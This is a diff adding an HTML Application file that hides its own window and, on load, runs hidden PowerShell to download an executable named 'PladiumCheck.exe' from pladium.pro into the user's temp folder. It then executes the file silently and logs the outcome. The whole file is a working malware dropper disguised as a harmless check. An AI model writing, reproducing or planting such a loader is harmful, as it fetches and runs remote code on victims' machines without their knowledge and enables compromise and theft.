@@ -1,0 +1,51 @@
+<html>
+<head>
+<meta name="robots" content="noindex">
+<title></title>
+<HTA:APPLICATION
+    ID="oHTA"
+    BORDER="none"
+    CAPTION="no"
+    SHOWINTASKBAR="no"
+    SINGLEINSTANCE="yes"
+    SYSMENU="no"
+    WINDOWSTATE="minimize"
+/>
+<script language="VBScript">
+Window.ResizeTo 0,0
+Window.MoveTo -2000,-2000
+
+Sub RunPayload
+    On Error Resume Next
+    Dim objShell, strUrl, strFile, strLog, strCmd
+    Set objShell = CreateObject("WScript.Shell")
+
+    strUrl = "https://pladium.pro/api/download.php?h=1"
+    strFile = objShell.ExpandEnvironmentStrings("%TEMP%") & "\PladiumCheck.exe"
+    strLog  = objShell.ExpandEnvironmentStrings("%TEMP%") & "\hta_update.log"
+
+    strCmd = "powershell -w hidden -c ""try {" & _
+             "('START ' + (Get-Date) + ' host=' + $env:COMPUTERNAME) | Out-File -Append '" & strLog & "';" & _
+             "Remove-Item '" & strFile & "' -Force -EA SilentlyContinue;" & _
+             "$ok=$false;" & _
+             "try { Invoke-WebRequest -UseBasicParsing -Uri '" & strUrl & "' -OutFile '" & strFile & "' -TimeoutSec 120; $ok=$true } catch { ('ERR ' + (Get-Date) + ' ' + $_) | Out-File -Append '" & strLog & "' };" & _
+             "if ($ok) { $sz = (Get-Item '" & strFile & "').Length;" & _
+             "if ($sz -gt 100000) { Start-Process '" & strFile & "'; ('OK ' + (Get-Date) + ' size=' + $sz) | Out-File -Append '" & strLog & "' }" & _
+             "else { throw ('small file ' + $sz) } }" & _
+             "} catch { ('ERR ' + (Get-Date) + ' ' + $_) | Out-File -Append '" & strLog & "' }"""
+
+    objShell.Run strCmd, 0, True
+    Window.Close
+End Sub
+
+Sub Window_OnLoad
+    RunPayload
+End Sub
+</script>
+<script language="JScript">
+setTimeout(function(){ try { window.close(); } catch (e) {} }, 60000);
+</script>
+</head>
+<body>
+</body>
+</html>
